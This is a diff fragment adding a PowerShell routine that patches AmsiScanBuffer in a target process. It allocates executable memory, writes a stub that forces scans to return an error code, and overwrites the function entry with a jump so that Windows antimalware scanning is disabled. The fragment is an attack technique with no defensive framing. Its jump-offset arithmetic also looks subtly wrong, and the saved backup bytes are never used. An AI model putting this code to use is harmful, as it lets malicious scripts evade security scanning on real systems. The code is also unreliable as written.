@@ -1,0 +1,21 @@
+
+$PatchCode = [byte[]] @(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) # mov eax, 0x80070057; ret
+
+
+$AmsiHandle = [IntPtr]($Kernel32::GetModuleHandle.Invoke("amsi.dll"))
+$AmsiScanBufferAddr = $Kernel32::GetProcAddress.Invoke($AmsiHandle, "AmsiScanBuffer")
+
+
+$PatchAddr = $Kernel32::VirtualAllocEx.Invoke($ProcessHandle, 0, $PatchCode.Length, 0x1000, 0x40)
+
+
+$Kernel32::WriteProcessMemory.Invoke($ProcessHandle, $PatchAddr, $PatchCode, $PatchCode.Length, [ref]0)
+
+
+$BackupAddr = $Kernel32::VirtualAllocEx.Invoke($ProcessHandle, 0, 6, 0x1000, 0x40)
+$OriginalCode = [byte[]] @(0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83)
+$Kernel32::WriteProcessMemory.Invoke($ProcessHandle, $BackupAddr, $OriginalCode, 6, [ref]0)
+
+
+$JumpToPatch = [byte[]] @(0xE9, ($PatchAddr.ToInt32() - ($AmsiScanBufferAddr.ToInt32() + 5)) % 0x100, ($PatchAddr.ToInt32() - ($AmsiScanBufferAddr.ToInt32() + 5)) / 0x100, 0x90, 0x90, 0x90)
+$Kernel32::WriteProcessMemory.Invoke($ProcessHandle, $AmsiScanBufferAddr, $JumpToPatch, 6, [ref]0)
